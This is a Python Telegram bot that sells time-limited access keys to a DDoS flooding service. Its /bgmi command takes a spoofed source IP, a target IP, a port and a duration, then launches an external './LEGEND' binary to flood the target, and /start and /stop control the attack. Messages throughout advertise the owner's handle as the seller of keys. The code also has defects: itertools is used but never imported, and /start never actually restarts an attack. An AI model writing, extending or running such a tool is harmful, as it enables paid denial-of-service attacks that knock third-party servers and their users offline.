from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import requests
import subprocess
import json
import os
import random
import string
import datetime
import socket
from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME

USER_FILE = "users.json"
KEY_FILE = "keys.json"

DEFAULT_THREADS = 100
users = {}
keys = {}
user_processes = {}

# Proxy related functions
proxy_api_url = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks4,socks5&timeout=500&country=all&ssl=all&anonymity=all'

proxy_iterator = None

def get_proxies():
    global proxy_iterator
    try:
        response = requests.get(proxy_api_url)
        if response.status_code == 200:
            proxies = response.text.splitlines()
            if proxies:
                proxy_iterator = itertools.cycle(proxies)
                return proxy_iterator
    except Exception as e:
        print(f"Error fetching proxies: {str(e)}")
    return None

def get_next_proxy():
    global proxy_iterator
    if proxy_iterator is None:
        proxy_iterator = get_proxies()
    return next(proxy_iterator, None)

def get_proxy_dict():
    proxy = get_next_proxy()
    return {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None

def load_data():
    global users, keys
    users = load_users()
    keys = load_keys()

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading users: {e}")
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def load_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading keys: {e}")
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def generate_key(length=6):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def add_time_to_current_date(hours=0, days=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        command = context.args
        if len(command) == 2:
            try:
                time_amount = int(command[0])
                time_unit = command[1].lower()
                if time_unit == 'hours':
                    expiration_date = add_time_to_current_date(hours=time_amount)
                elif time_unit == 'days':
                    expiration_date = add_time_to_current_date(days=time_amount)
                else:
                    raise ValueError("Invalid time unit")
                key = generate_key()
                keys[key] = expiration_date
                save_keys()
                response = f"Key generated: {key}\nExpires on: {expiration_date}"
            except ValueError:
                response = "Please specify a valid number and unit of time (hours/days)."
        else:
            response = "Usage: /genkey <amount> <hours/days>"
    else:
        response = "ONLY OWNER CAN USE💀OWNER @LEGACY4REAL0"

    await update.message.reply_text(response)

async def radeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    command = context.args
    if len(command) == 1:
        key = command[0]
        if key in keys:
            expiration_date = keys[key]
            if user_id in users:
                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            else:
                users[user_id] = expiration_date
            save_users()
            del keys[key]
            save_keys()
            response = f"✅Key redeemed successfully! Access granted until: {users[user_id]} OWNER- @LEGACY4REAL0..."
        else:
            response = "Invalid or expired key buy from @LEGACY4REAL0."
    else:
        response = "Usage: /radeem <key>"

    await update.message.reply_text(response)

async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global user_processes
    user_id = str(update.message.from_user.id)

    # Check user authorization and expiration
    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key. Buy key from @LEGACY4REAL0")
        return

    # Validate command arguments
    if len(context.args) != 4:
        await update.message.reply_text('Usage: /bgmi <spoof_ip> <target_ip> <port> <duration>')
        return

    spoof_ip = context.args[0]
    target_ip = context.args[1]
    port = context.args[2]
    duration = context.args[3]

    # Validate inputs
    try:
        # Ensure valid IPs and port
        if not (1 <= int(port) <= 65535):
            raise ValueError("Port must be between 1 and 65535")
        socket.inet_aton(spoof_ip)  # Validate spoof IP
        socket.inet_aton(target_ip)  # Validate target IP
    except Exception as e:
        await update.message.reply_text(f"Invalid input: {e}")
        return

    # Construct the command with spoof IP
    command = ['./LEGEND', spoof_ip, target_ip, port, duration]

    # Start the process and store it
    process = subprocess.Popen(command)
    user_processes[user_id] = {
        "process": process,
        "command": command,
        "spoof_ip": spoof_ip,
        "target_ip": target_ip,
        "port": port,
        "duration": duration,
    }

    await update.message.reply_text(
        f"Flooding parameters set:\nSpoof IP: {spoof_ip}\nTarget: {target_ip}:{port}\nDuration: {duration} seconds.\nOWNER- @LEGACY4REAL0"
    )

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key buy key from- @LEGACY4REAL0")
        return

    if user_id not in user_processes or user_processes[user_id]["process"].poll() is not None:
        await update.message.reply_text('No flooding parameters set. Use /bgmi to set parameters.')
        return

    if user_processes[user_id]["process"].poll() is None:
        await update.message.reply_text('Flooding is already running.')
        return

    user_processes[user_id]["process"] = subprocess.Popen(user_processes[user_id]["command"])
    await update.message.reply_text('Started flooding.')

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key buy key from- @LEGACY4REAL0")
        return

    if user_id not in user_processes or user_processes[user_id]["process"].poll() is not None:
        await update.message.reply_text('No flooding process is running.OWNER @LEGACY4REAL0')
        return

    user_processes[user_id]["process"].terminate()
    del user_processes[user_id]  # Clear the stored parameters
    
    await update.message.reply_text('Stopped flooding and cleared saved parameters.')

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        message = ' '.join(context.args)
        if not message:
            await update.message.reply_text('Usage: /broadcast <message>')
            return

        for user in users.keys():
            try:
                await context.bot.send_message(chat_id=int(user), text=message, request_kwargs={'proxies': get_proxy_dict()})
            except Exception as e:
                print(f"Error sending message to {user}: {e}")
        response = "Message sent to all users."
    else:
        response = "ONLY OWNER CAN USE."
    
    await update.message.reply_text(response)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    help_text = (
        "📜 *Available Commands:*\n\n"
        "1️⃣ /genkey <time_amount> <hours/days> - Generate access key (Admin only).\n"
        "2️⃣ /radeem <key> - Redeem an access key.\n"
        "3️⃣ /bgmi <spoof_ip> <target_ip> <port> <duration> - Set flooding parameters.\n"
        "4️⃣ /start - Start the flooding attack (requires parameters set with /bgmi).\n"
        "5️⃣ /stop - Stop the ongoing flooding attack.\n"
        "6️⃣ /broadcast <message> - Send a message to all users (Admin only).\n"
        "7️⃣ /help - Display this help message.\n\n"
        "OWNER - @LEGACY4REAL0"
    )
    await update.message.reply_text(help_text, parse_mode="Markdown")

if __name__ == "__main__":
    # Initialize the bot
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    # Load data
    load_data()

    # Register commands
    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("radeem", radeem))
    application.add_handler(CommandHandler("bgmi", bgmi))
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("broadcast", broadcast))
    application.add_handler(CommandHandler("help", help_command))

    # Start polling
    print("Bot is running...")
    application.run_polling()